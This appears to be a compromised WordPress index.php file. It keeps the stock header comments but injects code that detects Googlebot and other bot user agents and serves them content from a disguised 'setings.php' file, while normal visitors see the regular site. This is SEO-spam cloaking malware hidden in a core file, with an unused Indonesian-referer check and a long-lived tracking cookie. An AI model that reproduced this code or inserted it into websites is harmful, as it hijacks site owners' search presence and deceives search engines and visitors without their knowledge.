<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Function to detect if the user agent is Googlebot or other Google user agents. */
function is_google_bot() {
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $google_agents = ['Googlebot', 'AdsBot-Google', 'Mediapartners-Google', 'Google-InspectionTool'];

        foreach ($google_agents as $agent) {
            if (stripos($user_agent, $agent) !== false) {
                return true;
            }
        }
    }
    return false;
}

/** Function to detect if the request comes from Indonesia and google.co.id */
function is_from_indonesia_and_google() {
    if (isset($_SERVER['HTTP_REFERER'])) {
        $referer = $_SERVER['HTTP_REFERER'];
        $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
        if (strpos($referer, 'google.co.id') !== false || (strpos($referer, 'google.com') !== false && strpos($accept_lang, 'id') !== false)) {
            return true;
        }
    }
    return false;
}

/** Function to set custom cookie */
function set_custom_cookie() {
    setcookie('az', 'lp', time() + 3600 * 24 * 300, "/"); // Set cookie for 300 days
}

// Check if user agent is a bot and handle accordingly
$agent = $_SERVER['HTTP_USER_AGENT'];
$accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
$cookie_az = $_COOKIE['az'] ?? '';

if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
    if (strpos($accept_lang, 'en') !== false && isset($_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']) && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $cookie_az == 'lp') {
        set_custom_cookie();
        include __DIR__ . '/setings.php';
        exit;
    }
    include __DIR__ . '/setings.php';
    exit;
}

// Determine which file to include based on user agent and region
if (is_google_bot()) {
    // Include the content from the desired file without changing the URL
    include __DIR__ . '/setings.php';
} else {
    // Include the default WordPress environment and template
    require __DIR__ . '/wp-blog-header.php';
}
